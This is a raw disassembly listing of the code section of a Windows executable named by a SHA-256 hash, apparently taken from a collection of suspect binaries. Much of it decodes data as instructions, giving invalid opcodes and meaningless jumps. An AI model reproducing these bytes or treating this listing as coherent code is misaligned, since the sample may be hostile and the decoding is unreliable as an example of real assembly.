
c3180248d4c8b425a210103507b2303ff29e5e8b2beb074db7b8878b06830c76.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	add    dh,dh
  401002:	add    eax,DWORD PTR [eax]
  401004:	jne    0x401001
  401006:	inc    ebx
  401007:	add    BYTE PTR [edx],bh
  401009:	addr16 je 0x40105c
  40100c:	pop    es
  40100d:	ins    DWORD PTR es:[edi],dx
  40100e:	arpl   WORD PTR [ecx-0x27],ax
  401011:	data16 jb 0x401079
  401014:	out    0x71,al
  401016:	add    BYTE PTR [eax],al
  401018:	mov    cl,0x6d
  40101a:	popa   
  40101b:	fs test eax,0xd472626b
  401021:	jo     0x40109c
  401023:	inc    ebp
  401024:	int    0x43
  401026:	add    BYTE PTR [eax],al
  401028:	mov    cl,0x6d
  40102a:	popa   
  40102b:	fs test eax,0x9472626b
  401031:	jo     0x4010ac
  401033:	inc    ebp
  401034:	lods   eax,DWORD PTR ds:[esi]
  401035:	push   ebp
  401036:	add    BYTE PTR [eax],al
  401038:	mov    edx,0x8a4d7467
  40103d:	data16 jne 0x4010ac
  401040:	cwde   
  401041:	dec    edx
  401042:	popa   
  401043:	outs   dx,BYTE PTR ds:[esi]
  401044:	xchg   ecx,eax
  401045:	outs   dx,BYTE PTR ds:[esi]
  401046:	gs inc ecx
  401048:	jne    0x40104c
  40104a:	add    BYTE PTR [eax],al
  40104c:	mov    dh,0x70
  40104e:	gs popa 
  401050:	imul   esp,DWORD PTR [edi+0x46],0x41675969
  401057:	add    BYTE PTR [ecx+0x71],dl
  40105a:	je     0x4010ce
  40105c:	push   esi
  40105d:	arpl   WORD PTR [ecx+eax*2+0x75],si
  401061:	add    al,BYTE PTR [eax]
  401063:	add    BYTE PTR [edx],dh
  401065:	addr16 je 0x4010bf
  401068:	add    BYTE PTR [eax],al
  40106a:	add    BYTE PTR [eax],al
  40106c:	add    BYTE PTR [esp+ebp*2+0x64],cl
  401070:	outs   dx,DWORD PTR ds:[esi]
  401071:	inc    edx
  401072:	jno    0x4010b8
  401074:	imul   esp,DWORD PTR [edi],0x1a746367
  40107a:	jo     0x4010f5
  40107c:	inc    ecx
  40107d:	jne    0x401081
  40107f:	add    BYTE PTR [eax],al
  401081:	xor    ah,BYTE PTR [edi+0x74]
  401084:	dec    ebp
  401085:	and    ah,BYTE PTR [esi+0x75]
  401088:	ins    BYTE PTR es:[edi],dx
  401089:	adc    BYTE PTR [edx+0x61],cl
  40108c:	outs   dx,BYTE PTR ds:[esi]
  40108d:	sbb    DWORD PTR [esi+0x65],ebp
  401090:	push   edi
  401091:	jne    0x401095
  401093:	add    BYTE PTR [eax],al
  401095:	jns    0x401096
  401097:	aas    
  401098:	add    BYTE PTR [ecx-0x66ffc001],al
  40109e:	(bad)  
  40109f:	aas    
  4010a0:	add    BYTE PTR [ecx-0x42ffc001],ah
  4010a6:	(bad)  
  4010a7:	aas    
  4010a8:	add    BYTE PTR [ecx-0x2affc001],ah
  4010ae:	(bad)  
  4010af:	aas    
  4010b0:	add    BYTE PTR [ebp-0x45ffc001],bh
  4010b6:	gs je  0x401109
  4010b9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4010ba:	imul   esp,DWORD PTR [ebx+0x41],0xffffff99
  4010be:	data16 jb 0x401126
  4010c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4010c2:	outs   dx,DWORD PTR ds:[esi]
  4010c3:	add    BYTE PTR [eax],al
  4010c5:	shr    DWORD PTR [ebx+0x61],0x64
  4010c9:	mov    ecx,0x94726269
  4010ce:	jo     0x401149
  4010d0:	inc    ebp
  4010d1:	add    BYTE PTR [eax],al
  4010d3:	add    BYTE PTR [eax],al
  4010d5:	add    BYTE PTR [ebp+0x41],bh
  4010d8:	add    BYTE PTR [eax],al
  4010da:	pop    esi
  4010db:	gs jb  0x40114c
  4010de:	push   eax
  4010df:	outs   dx,BYTE PTR ds:[esi]
  4010e0:	xor    esi,DWORD PTR [edx]
  4010e2:	xchg   ebx,eax
  4010e3:	data16 ins BYTE PTR es:[edi],dx
  4010e5:	ins    BYTE PTR es:[edi],dx
  4010e6:	jne    0x4010ea
  4010e8:	add    BYTE PTR [eax],al
  4010ea:	pusha  
  4010eb:	outs   dx,DWORD PTR ds:[esi]
  4010ec:	jbe    0x401151
  4010ee:	inc    edi
  4010ef:	jbe    0x40111f
  4010f1:	fs push ecx
  4010f3:	outs   dx,BYTE PTR ds:[esi]
  4010f4:	add    BYTE PTR [eax],al
  4010f6:	dec    eax
  4010f7:	gs ins DWORD PTR es:[edi],dx
  4010f9:	jae    0x401113
  4010fb:	jbe    0x4010fd
  4010fd:	add    BYTE PTR [eax],bl
  4010ff:	outs   dx,DWORD PTR ds:[esi]
  401100:	jbe    0x401165
  401102:	daa    
  401103:	jbe    0x401133
  401105:	or     DWORD PTR fs:[esi+0x0],ebp
  401109:	add    BYTE PTR [eax],ah
  40110b:	gs ins DWORD PTR es:[edi],dx
  40110d:	arpl   WORD PTR ds:0x2b000079,ax
  401113:	imul   esi,DWORD PTR [edx+0x74],0x416c6100
  40111a:	loope  0x40118a
  40111c:	outs   dx,DWORD PTR ds:[esi]
  40111d:	arpl   WORD PTR [ebp+0x2],si
  401120:	add    BYTE PTR [eax],al
  401122:	retf   
  401123:	imul   esi,DWORD PTR [edx+0x74],0x416c61e0
  40112a:	loope  0x40119a
  40112c:	outs   dx,DWORD PTR ds:[esi]
  40112d:	arpl   WORD PTR [ebp+0x2],si
  401130:	add    BYTE PTR [eax],al
  401132:	test   al,0x6c
  401134:	ins    DWORD PTR es:[edi],dx
  401135:	popa   
  401136:	lds    edx,FWORD PTR [ecx+ebp*2+0x65]
  40113a:	add    BYTE PTR [eax],al
  40113c:	add    BYTE PTR [eax],al
  40113e:	add    BYTE PTR [edx-0x63b999b5],ch
  401144:	outs   dx,BYTE PTR ds:[esi]
  401145:	gs add bl,cl
  401148:	imul   esi,DWORD PTR [edx+0x74],0x506c61a0
  40114f:	xchg   DWORD PTR [ebx+0x74],ebp
  401152:	gs xchg esi,eax
  401154:	jbe    0x401156
  401156:	add    BYTE PTR [ebp-0x4b8f9e9b],ch
  40115c:	outs   dx,BYTE PTR ds:[esi]
  40115d:	ins    BYTE PTR es:[edi],dx
  40115e:	outs   dx,DWORD PTR ds:[esi]
  40115f:	push   esi
  401160:	add    al,BYTE PTR [eax]
  401162:	add    BYTE PTR [esi+0x65],bl
  401165:	jb     0x4011d5
  401167:	pop    eax
  401168:	outs   dx,BYTE PTR ds:[esi]
  401169:	xor    esi,DWORD PTR [edx]
  40116b:	mov    esp,DWORD PTR [esi+0x6c]
  40116e:	ins    BYTE PTR es:[edi],dx
  40116f:	jne    0x401173
  401171:	add    BYTE PTR [eax],al
  401173:	xor    ah,BYTE PTR [ebp+0x74]
  401176:	push   eax
  401177:	inc    edi
  401178:	imul   esp,DWORD PTR [ebx+0x65],0x46
  40117c:	outs   dx,DWORD PTR ds:[esi]
  40117d:	dec    eax
  40117e:	gs adc al,0x72
  401181:	add    BYTE PTR [eax],al
  401183:	jne    0x401187
  401185:	loopne 0x40118a
  401187:	jne    0x40112f
  401189:	pop    ecx
  40118a:	add    BYTE PTR [ebp-0x17],dh
  40118d:	add    eax,DWORD PTR [eax]
  40118f:	jne    0x40117a
  401191:	add    eax,DWORD PTR [eax]
  401193:	jne    0x40117e
  401195:	add    eax,DWORD PTR [eax]
  401197:	jne    0x401182
  401199:	add    eax,DWORD PTR [eax]
  40119b:	jne    0x401186
  40119d:	add    eax,DWORD PTR [eax]
  40119f:	jne    0x40118c
  4011a1:	add    eax,DWORD PTR [eax]
  4011a3:	add    BYTE PTR [eax],al
  4011a5:	add    BYTE PTR [eax],al
  4011a7:	add    BYTE PTR [ebp-0x15],dh
  4011aa:	add    eax,DWORD PTR [eax]
  4011ac:	jne    0x401199
  4011ae:	add    eax,DWORD PTR [eax]
  4011b0:	jne    0x40119d
  4011b2:	add    eax,DWORD PTR [eax]
  4011b4:	jne    0x4011a1
  4011b6:	add    eax,DWORD PTR [eax]
  4011b8:	jne    0x4011a5
  4011ba:	add    eax,DWORD PTR [eax]
  4011bc:	jne    0x4011a9
  4011be:	add    eax,DWORD PTR [eax]
  4011c0:	jne    0x4011ad
  4011c2:	add    eax,DWORD PTR [eax]
  4011c4:	jne    0x4011b1
  4011c6:	add    eax,DWORD PTR [eax]
  4011c8:	jne    0x40116d
  4011ca:	add    al,0x0
  4011cc:	jne    0x4011b9
  4011ce:	add    eax,DWORD PTR [eax]
  4011d0:	jne    0x4011bd
  4011d2:	add    eax,DWORD PTR [eax]
  4011d4:	jne    0x4011c1
  4011d6:	add    eax,DWORD PTR [eax]
  4011d8:	jne    0x4011c5
  4011da:	add    eax,DWORD PTR [eax]
  4011dc:	jne    0x4011c9
  4011de:	add    eax,DWORD PTR [eax]
  4011e0:	jne    0x4011cd
  4011e2:	add    eax,DWORD PTR [eax]
  4011e4:	jne    0x4011d1
  4011e6:	add    eax,DWORD PTR [eax]
  4011e8:	jne    0x4011d5
  4011ea:	add    eax,DWORD PTR [eax]
  4011ec:	jne    0x4011d9
  4011ee:	add    eax,DWORD PTR [eax]
  4011f0:	jne    0x4011dd
  4011f2:	add    eax,DWORD PTR [eax]
  4011f4:	jne    0x4011e1
  4011f6:	add    eax,DWORD PTR [eax]
  4011f8:	jne    0x4011e5
  4011fa:	add    eax,DWORD PTR [eax]
  4011fc:	jne    0x4011e9
  4011fe:	add    eax,DWORD PTR [eax]
  401200:	jne    0x4011ed
  401202:	add    eax,DWORD PTR [eax]
  401204:	jne    0x401208
  401206:	jmp    0xe942870e
  40120b:	add    eax,DWORD PTR [eax]
  40120d:	add    BYTE PTR [eax],al
  40120f:	add    BYTE PTR [eax],al
  401211:	jne    0x401215
  401213:	jmp    0xe942871b
  401218:	add    esi,DWORD PTR [ebp+0x2]
  40121b:	jmp    0xe9428723
  401220:	add    esi,DWORD PTR [ebp+0x2]
  401223:	jmp    0xe942872b
  401228:	add    esi,DWORD PTR [ebp+0x2]
  40122b:	jmp    0xe9428733
  401230:	add    esi,DWORD PTR [ebp+0x2]
  401233:	jmp    0xe942873b
  401238:	add    esi,DWORD PTR [ebp+0x2]
  40123b:	jmp    0xe9428743
  401240:	add    esi,DWORD PTR [ebp+0x2]
  401243:	jmp    0xe942874b
  401248:	add    esi,DWORD PTR [ebp+0x2]
  40124b:	jmp    0xe9428753
  401250:	add    esi,DWORD PTR [ebp+0x2]
  401253:	jmp    0xe942875b
  401258:	add    esi,DWORD PTR [ebp+0x2]
  40125b:	jmp    0xe9428763
  401260:	add    esi,DWORD PTR [ebp+0x2]
  401263:	jmp    0xe942876b
  401268:	add    esi,DWORD PTR [ebp+0x2]
  40126b:	jmp    0xe9428773
  401270:	add    esi,DWORD PTR [ebp+0x2]
  401273:	jmp    0x40127b
  401278:	add    BYTE PTR [eax],al
  40127a:	jne    0x40127e
  40127c:	jmp    0xe9428784
  401281:	add    esi,DWORD PTR [ebp+0x2]
  401284:	jmp    0x42878c
  401289:	jmp    0xe9401504
  40128e:	jbe    0x401292
  401290:	add    BYTE PTR [ecx-0x52fffdcb],bh
  401296:	jns    0x40129d
  401298:	add    BYTE PTR [esi-0x16b08968],dl
  40129e:	jbe    0x4012a2
  4012a0:	add    cl,ch
  4012a2:	jbe    0x4012a6
  4012a4:	add    BYTE PTR [ecx],cl
  4012a6:	jbe    0x4012ac
  4012a8:	add    edx,esp
  4012aa:	jno    0x4012b8
  4012ac:	add    cl,ch
  4012ae:	push   ds
  4012af:	add    al,0x0
  4012b1:	jmp    0xe940157c
  4012b6:	jbe    0x4012ba
  4012b8:	add    BYTE PTR [ebp+ebx*8+0x1],ah
  4012bc:	add    cl,ch
  4012be:	data16 add al,BYTE PTR [eax]
  4012c1:	jmp    0xe94016fc
  4012c6:	jbe    0x40130a
  4012c8:	add    cl,ch
  4012ca:	data16 add al,BYTE PTR [eax]
  4012cd:	jmp    0xec40154a
  4012d2:	jbe    0x4012d5
  4012d4:	add    al,ch
  4012d6:	jbe    0x4012da
  4012d8:	add    ah,ch
  4012da:	jbe    0x4012dd
  4012dc:	add    cl,ch
  4012de:	add    BYTE PTR [eax],al
  4012e0:	add    BYTE PTR [eax],al
  4012e2:	add    BYTE PTR [esi+0x2],dh
  4012e5:	add    cl,ch
  4012e7:	push   esi
  4012e8:	(bad)  
  4012e9:	(bad)  
  4012ea:	call   0xea400af1
  4012ef:	jbe    0x4012f3
  4012f1:	add    bl,ch
  4012f3:	jbe    0x4012f7
  4012f5:	sub    ecx,0xe9001276
  4012fb:	xchg   BYTE PTR [edx],al
  4012fd:	add    cl,ch
  4012ff:	jbe    0x401313
  401301:	add    cl,ch
  401303:	data16 add al,BYTE PTR [eax]
  401306:	add    ah,bl
  401308:	add    eax,DWORD PTR [eax]
  40130a:	add    BYTE PTR [ebx+eax*1+0x3cc0000],bl
  401311:	add    BYTE PTR [eax],al
  401313:	pushf  
  401314:	add    eax,DWORD PTR [eax]
  401316:	add    BYTE PTR [eax-0x33fffc6d],cl
  40131c:	add    al,0x0
  40131e:	add    BYTE PTR [ebx+eax*1+0x39c0000],cl
  401325:	add    BYTE PTR [eax],al
  401327:	pushf  
  401328:	add    eax,DWORD PTR [eax]
  40132a:	add    BYTE PTR [ebx+eax*1+0x38c0000],cl
  401331:	add    BYTE PTR [eax],al
  401333:	pop    esp
  401334:	add    eax,DWORD PTR [eax]
  401336:	add    BYTE PTR [ebx+esi*8+0x3],bl
  40133a:	add    BYTE PTR [esp+ebx*1+0x34c0000],bh
  401341:	add    BYTE PTR [eax],al
  401343:	pop    esp
  401344:	add    eax,DWORD PTR [eax]
  401346:	add    BYTE PTR [eax],al
  401348:	add    BYTE PTR [eax],al
  40134a:	add    BYTE PTR [eax],al
  40134c:	pop    esp
  40134d:	add    eax,DWORD PTR [eax]
  40134f:	add    BYTE PTR [ebx+eax*1+0x0],cl
  401353:	add    BYTE PTR [ebx+eax*1+0x0],cl
  401357:	add    BYTE PTR [ebx+eax*1],bl
  40135a:	add    BYTE PTR [eax],al
  40135c:	sbb    al,0x3
  40135e:	add    BYTE PTR [eax],al
  401360:	or     al,0x3
  401362:	add    BYTE PTR [eax],al
  401364:	or     al,0x3
  401366:	add    BYTE PTR [eax],al
  401368:	sbb    al,0x3
  40136a:	add    BYTE PTR [eax],al
  40136c:	sbb    al,0x3
  40136e:	add    BYTE PTR [eax],al
  401370:	or     al,0x3
  401372:	add    BYTE PTR [eax],al
  401374:	or     al,0x13
  401376:	add    BYTE PTR [eax],al
  401378:	cmp    al,0x1
  40137a:	add    BYTE PTR [eax],al
  40137c:	fadd   QWORD PTR [edx]
  40137e:	add    BYTE PTR [eax],al
  401380:	int3   
  401381:	add    al,BYTE PTR [eax]
  401383:	add    BYTE PTR [ebp-0x17],dh
  401386:	add    eax,DWORD PTR [eax]
  401388:	jne    0x401373
  40138a:	add    eax,DWORD PTR [eax]
  40138c:	jne    0x401377
  40138e:	add    eax,DWORD PTR [eax]
  401390:	jne    0x40137b
  401392:	add    eax,DWORD PTR [eax]
  401394:	jne    0x401395
  401396:	outs   dx,DWORD PTR ds:[esi]
  401397:	gs sub eax,0x750003ad
  40139d:	add    esp,DWORD PTR [edx+0x13e97503]
  4013a3:	add    BYTE PTR [ebp-0x17],dh
  4013a6:	stos   DWORD PTR es:[edi],eax
  4013a7:	add    esi,DWORD PTR [ebp-0x17]
  4013aa:	(bad)  
  4013ab:	dec    DWORD PTR [edx+0x3e8]
  4013b1:	add    BYTE PTR [eax],al
  4013b3:	add    BYTE PTR [eax],al
  4013b5:	jne    0x4013a0
  4013b7:	add    eax,DWORD PTR [eax]
  4013b9:	jne    0x4013a4
  4013bb:	add    eax,DWORD PTR [eax]
  4013bd:	jne    0x40138a
  4013bf:	add    eax,DWORD PTR [eax]
  4013c1:	aad    0xd
  4013c3:	pusha  
  4013c4:	popa   
  4013c5:	jmp    0x75401814
  4013ca:	inc    edi
  4013cb:	and    DWORD PTR [eax],eax
  4013cd:	jne    0x4013ba
  4013cf:	ret    
  4013d0:	add    esi,DWORD PTR [ebp-0x15]
  4013d3:	or     eax,DWORD PTR [eax]
  4013d5:	jne    0x4013c2
  4013d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4013d8:	add    esi,DWORD PTR [ebp-0x15]
  4013db:	add    eax,DWORD PTR [eax]
  4013dd:	jne    0x4013ca
  4013df:	add    eax,DWORD PTR [eax]
  4013e1:	jne    0x4013ce
  4013e3:	add    eax,DWORD PTR [eax]
  4013e5:	jne    0x401412
  4013e7:	add    al,0x0
  4013e9:	xor    eax,0xa16571be
  4013ee:	hlt    
  4013ef:	bound  eax,QWORD PTR [eax]
  4013f1:	jne    0x40143c
  4013f3:	sub    al,0x0
  4013f5:	jne    0x4013e2
  4013f7:	repz add esi,DWORD PTR [ebp-0x15]
  4013fb:	sub    DWORD PTR [eax],eax
  4013fd:	jne    0x4013ea
  4013ff:	scas   eax,DWORD PTR es:[edi]
  401400:	add    esi,DWORD PTR [ebp+0x2]
  401403:	jmp    0xe942890b
  401408:	add    esi,DWORD PTR [ebp+0x2]
  40140b:	jmp    0xa9428913
  401410:	add    esi,DWORD PTR [ebp+0x40]
  401413:	jmp    0xe942891b
  401418:	add    eax,DWORD PTR [eax]
  40141a:	add    BYTE PTR [eax],al
  40141c:	add    BYTE PTR [eax],al
  40141e:	jne    0x401422
  401420:	jmp    0xe9428928
  401425:	add    esi,DWORD PTR [ebp+0x2]
  401428:	jmp    0xe9428930
  40142d:	add    esi,DWORD PTR [ebp+0x2]
  401430:	jmp    0xe9428938
  401435:	add    esi,DWORD PTR [ebp+0x2]
  401438:	jmp    0xe9428940
  40143d:	add    esi,DWORD PTR [ebp+0x2]
  401440:	jmp    0xe9428948
  401445:	add    esi,DWORD PTR [ebp+0x2]
  401448:	jmp    0xe9428950
  40144d:	add    esi,DWORD PTR [ebp+0x2]
  401450:	jmp    0xe9428958
  401455:	add    esi,DWORD PTR [ebp+0x2]
  401458:	jmp    0xe9428960
  40145d:	add    esi,DWORD PTR [ebp+0x2]
  401460:	jmp    0xe9428968
  401465:	add    esi,DWORD PTR [ebp+0x2]
  401468:	jmp    0xe9428970
  40146d:	add    esi,DWORD PTR [ebp+0x2]
  401470:	jmp    0xe9428978
  401475:	add    esi,DWORD PTR [ebp+0x2]
  401478:	jmp    0xe9428980
  40147d:	add    esi,DWORD PTR [ebp+0x2]
  401480:	add    cl,ch
  401482:	add    BYTE PTR [eax],al
  401484:	add    BYTE PTR [eax],al
  401486:	add    BYTE PTR [esi+0x2],dh
  401489:	add    cl,ch
  40148b:	jbe    0x40148f
  40148d:	add    cl,ch
  40148f:	jbe    0x401493
  401491:	add    cl,ch
  401493:	jbe    0x401497
  401495:	add    cl,ch
  401497:	jbe    0x40149b
  401499:	add    cl,ch
  40149b:	jbe    0x40149f
  40149d:	add    cl,ch
  40149f:	jbe    0x4014a3
  4014a1:	add    cl,ch
  4014a3:	jbe    0x4014a7
  4014a5:	add    cl,ch
  4014a7:	jbe    0x4014ab
  4014a9:	add    cl,ch
  4014ab:	jbe    0x4014af
  4014ad:	add    cl,ch
  4014af:	jbe    0x4014b3
  4014b1:	add    cl,ch
  4014b3:	jbe    0x4014b7
  4014b5:	add    cl,ch
  4014b7:	jbe    0x4014bb
  4014b9:	add    cl,ch
  4014bb:	jbe    0x4014bf
  4014bd:	add    cl,ch
  4014bf:	jbe    0x4014c3
  4014c1:	add    cl,ch
  4014c3:	jbe    0x4014c7
  4014c5:	add    cl,ch
  4014c7:	jbe    0x4014cb
  4014c9:	add    cl,ch
  4014cb:	jbe    0x4014cf
  4014cd:	add    cl,ch
  4014cf:	jbe    0x4014d3
  4014d1:	add    cl,ch
  4014d3:	jbe    0x4014d7
  4014d5:	add    cl,ch
  4014d7:	jbe    0x4014db
  4014d9:	add    cl,ch
  4014db:	jbe    0x4014df
  4014dd:	add    cl,ch
  4014df:	jbe    0x4014e3
  4014e1:	add    cl,ch
  4014e3:	jbe    0x4014e7
  4014e5:	add    cl,ch
  4014e7:	jbe    0x4014eb
  4014e9:	add    cl,ch
  4014eb:	add    BYTE PTR [eax],al
  4014ed:	add    BYTE PTR [eax],al
  4014ef:	add    BYTE PTR [esi+0x2],dh
  4014f2:	add    cl,ch
  4014f4:	jbe    0x4014f8
  4014f6:	add    cl,ch
  4014f8:	jbe    0x4014fc
  4014fa:	add    cl,ch
  4014fc:	jbe    0x401500
  4014fe:	add    cl,ch
  401500:	jbe    0x401504
  401502:	add    BYTE PTR [eax],al
  401504:	or     al,0x0
  401506:	add    BYTE PTR [eax],al
  401508:	or     al,0x0
  40150a:	add    BYTE PTR [eax],al
  40150c:	fdiv   st(7),st
  40150e:	(bad)  
  40150f:	(bad)  
  401510:	fdiv   st(7),st
  401512:	(bad)  
  401513:	dec    esp
  401515:	(bad)  
  401516:	(bad)  
  401517:	dec    esp
  401519:	(bad)  
  40151a:	(bad)  
  40151b:	(bad)  
  40151c:	fdiv   st(7),st
  40151e:	(bad)  
  40151f:	(bad)  
  401520:	fdiv   st(7),st
  401522:	(bad)  
  401523:	dec    esp
  401525:	(bad)  
  401526:	(bad)  
  401527:	dec    esp
  401529:	(bad)  
  40152a:	(bad)  
  40152b:	call   FWORD PTR [edi+edi*8-0x630001]
  401532:	(bad)  
  401533:	dec    DWORD PTR [edi+edi*8-0x730001]
  40153a:	(bad)  
  40153b:	call   FWORD PTR [edi+edi*8-0x630001]
  401542:	(bad)  
  401543:	dec    DWORD PTR [edi+edi*8-0x730001]
  40154a:	(bad)  
  40154b:	call   FWORD PTR [edi+edi*8-0x1]
  40154f:	call   FWORD PTR [edi+edi*8-0x1]
  401553:	inc    DWORD PTR [eax]
  401555:	add    BYTE PTR [eax],al
  401557:	add    BYTE PTR [eax],al
  401559:	dec    esp
  40155a:	(bad)  
  40155b:	(bad)  
  40155c:	dec    DWORD PTR [edi+edi*8-0x1]
  401560:	call   FWORD PTR [edi+edi*8-0x1]
  401564:	call   FWORD PTR [edi+edi*8-0x1]
  401568:	dec    DWORD PTR [edi+edi*8-0x1]
  40156c:	dec    DWORD PTR [edi+edi*8-0x1]
  401570:	call   FWORD PTR [edi+edi*8]
  401573:	(bad)  
  401574:	call   FWORD PTR [edi+edi*8]
  401577:	(bad)  
  401578:	dec    DWORD PTR [edi+edi*8]
  40157b:	(bad)  
  40157c:	dec    DWORD PTR [edi+edi*8]
  40157f:	(bad)  
  401580:	push   DWORD PTR [ebp-0x17]
  401583:	add    eax,DWORD PTR [eax]
  401585:	jne    0x401570
  401587:	add    eax,DWORD PTR [eax]
  401589:	jne    0x401574
  40158b:	add    eax,DWORD PTR [eax]
  40158d:	jne    0x401578
  40158f:	add    eax,DWORD PTR [eax]
  401591:	jne    0x40157c
  401593:	add    eax,DWORD PTR [eax]
  401595:	jne    0x401580
  401597:	add    eax,DWORD PTR [eax]
  401599:	jne    0x401584
  40159b:	add    eax,DWORD PTR [eax]
  40159d:	jne    0x401588
  40159f:	add    eax,DWORD PTR [eax]
  4015a1:	jne    0x40158c
  4015a3:	add    eax,DWORD PTR [eax]
  4015a5:	jne    0x401590
  4015a7:	add    eax,DWORD PTR [eax]
  4015a9:	jne    0x401594
  4015ab:	add    eax,DWORD PTR [eax]
  4015ad:	jne    0x401598
  4015af:	add    eax,DWORD PTR [eax]
  4015b1:	jne    0x40159c
  4015b3:	add    eax,DWORD PTR [eax]
  4015b5:	jne    0x4015a0
  4015b7:	add    eax,DWORD PTR [eax]
  4015b9:	jne    0x4015a4
  4015bb:	add    eax,DWORD PTR [eax]
  4015bd:	add    BYTE PTR [eax],al
  4015bf:	add    BYTE PTR [eax],al
  4015c1:	add    BYTE PTR [ebp-0x17],dh
  4015c4:	add    eax,DWORD PTR [eax]
  4015c6:	jne    0x401643
  4015c8:	test   eax,0xa95b7503
  4015cd:	add    esi,DWORD PTR [ebp+0x5f]
  4015d0:	test   eax,0xa9457503
  4015d5:	add    esi,DWORD PTR [ebp+0x39]
  4015d8:	test   eax,0xa90d7503
  4015dd:	add    esi,DWORD PTR [ebp-0x41]
  4015e0:	sahf   
  4015e1:	add    esi,DWORD PTR [ebp-0x2f]
  4015e4:	sahf   
  4015e5:	add    esi,DWORD PTR [ebp-0x15]
  4015e8:	sahf   
  4015e9:	add    esi,DWORD PTR [ebp+0x7]
  4015ec:	lahf   
  4015ed:	add    esi,DWORD PTR [ebp-0x11]
  4015f0:	sahf   
  4015f1:	add    esi,DWORD PTR [ebp+0x1d]
  4015f4:	lahf   
  4015f5:	add    esi,DWORD PTR [ebp+0xf]
  4015f8:	lahf   
  4015f9:	add    esi,DWORD PTR [ebp+0x43]
  4015fc:	lahf   
  4015fd:	add    esi,DWORD PTR [ebp+0x2]
  401600:	daa    
  401601:	lahf   
  401602:	jbe    0x401606
  401604:	jns    0x4015a5
  401606:	jbe    0x40160a
  401608:	inc    ebx
  401609:	lahf   
  40160a:	jbe    0x40160e
  40160c:	test   eax,0xa102769f
  401611:	lahf   
  401612:	jbe    0x401616
  401614:	jns    0x4015b5
  401616:	jbe    0x40161a
  401618:	loope  0x4015b9
  40161a:	jbe    0x40161e
  40161c:	rcr    DWORD PTR [edi-0x6052fd8a],0x76
  401623:	add    bl,ch
  401625:	lahf   
  401626:	add    BYTE PTR [eax],al
  401628:	add    BYTE PTR [eax],al
  40162a:	add    BYTE PTR [esi+0x2],dh
  40162d:	jno    0x4015cf
  40162f:	jbe    0x401633
  401631:	xchg   ebp,eax
  401632:	mov    al,ds:0xa0190276
  401637:	jbe    0x40163b
  401639:	sbb    eax,0x390276a0
  40163e:	mov    al,ds:0xa0e10276
  401643:	jbe    0x401647
  401645:	pop    es
  401646:	mov    eax,ds:0xa0d90276
  40164b:	jbe    0x40164f
  40164d:	mov    bh,0x9d
  40164f:	jbe    0x401653
  401651:	jmp    0xd5428b59
  401656:	mov    ch,0x76
  401658:	add    ch,bh
  40165a:	mov    ch,0x76
  40165c:	add    dh,ch
  40165e:	mov    ah,0x76
  401660:	add    al,BYTE PTR ds:0xab0276b5
  401666:	mov    ah,0x76
  401668:	add    cl,BYTE PTR [ebp+0x7f0276b4]
  40166e:	mov    ah,0x76
  401670:	add    bl,BYTE PTR [edi]
  401672:	mov    dh,0x76
  401674:	add    ch,cl
  401676:	add    esi,DWORD PTR [ebp+0x2]
  401679:	test   eax,0x276b3
  40167e:	pop    ds
  40167f:	loope  0x401685
  401681:	add    BYTE PTR [ebx-0x1a],bh
  401684:	add    al,0x0
  401686:	xor    esp,ecx
  401688:	add    al,0x0
  40168a:	jecxz  0x401652
  40168c:	add    al,0x0
  40168e:	inc    ecx
  40168f:	add    BYTE PTR [eax],al
  401691:	add    BYTE PTR [eax],al
  401693:	add    dh,al
  401695:	add    al,0x0
  401697:	ins    DWORD PTR es:[edi],dx
  401698:	mov    BYTE PTR [eax+eax*1],0x71
  40169c:	mov    BYTE PTR [eax+eax*1],0xfd
  4016a0:	es add eax,0x526fb00
  4016a6:	add    BYTE PTR [edi],al
  4016a8:	sub    DWORD PTR ds:0x5211300,eax
  4016ae:	add    BYTE PTR ds:0x53000506,ch
  4016b4:	pop    ss
  4016b5:	add    eax,0x506f500
  4016ba:	add    cl,ch
  4016bc:	jbe    0x4016c0
  4016be:	add    BYTE PTR [ebx],ch
  4016c0:	jmp    0x2:0x76e90004
  4016c7:	test   DWORD PTR [eax*1+0x5045900],eax
  4016ce:	add    BYTE PTR [edi],ah
  4016d0:	in     al,0x4
  4016d2:	add    BYTE PTR [edi],bh
  4016d4:	in     al,0x4
  4016d6:	add    ch,bh
  4016d8:	in     eax,0x4
  4016da:	add    BYTE PTR [ecx],al
  4016dc:	in     al,0x4
  4016de:	add    bl,ch
  4016e0:	pop    es
  4016e1:	add    al,0x0
  4016e3:	fild   WORD PTR [edi]
  4016e5:	add    al,0x0
  4016e7:	lds    eax,FWORD PTR [edi]
  4016e9:	add    al,0x0
  4016eb:	pop    ds
  4016ec:	add    al,0x4
  4016ee:	add    BYTE PTR ds:0x3d0003e4,ah
  4016f4:	in     al,0x3
  4016f6:	add    BYTE PTR [ecx+0x0],al
  4016f9:	add    BYTE PTR [eax],al
  4016fb:	add    BYTE PTR [eax],al
  4016fd:	in     al,0x3
  4016ff:	add    BYTE PTR [eax],al
  401701:	mov    ah,0x91
  401703:	add    eax,DWORD PTR [eax]
  401705:	cwde   
  401706:	xchg   ecx,eax
  401707:	add    eax,DWORD PTR [eax]
  401709:	int3   
  40170a:	xchg   ecx,eax
  40170b:	add    eax,DWORD PTR [eax]
  40170d:	mov    dl,0x91
  40170f:	add    eax,DWORD PTR [eax]
  401711:	mov    eax,0xcc000391
  401716:	xchg   ecx,eax
  401717:	add    eax,DWORD PTR [eax]
  401719:	rcl    BYTE PTR [ecx-0x6e7dfffd],0x3
  401720:	add    BYTE PTR [esi],cl
  401722:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401723:	add    eax,DWORD PTR [eax]
  401725:	retf   0x3a3
  401728:	add    BYTE PTR [ebx+eiz*4-0x5971fffd],dh
  40172f:	add    eax,DWORD PTR [eax]
  401731:	push   ds
  401732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401733:	add    eax,DWORD PTR [eax]
  401735:	mov    esi,0xae0003a3
  40173a:	mov    ds:0xa6540003,eax
  40173f:	add    eax,DWORD PTR [eax]
  401741:	push   esi
  401742:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401743:	add    eax,DWORD PTR [eax]
  401745:	add    ah,BYTE PTR [edi-0x59dffffd]
  40174b:	add    eax,DWORD PTR [eax]
  40174d:	push   esp
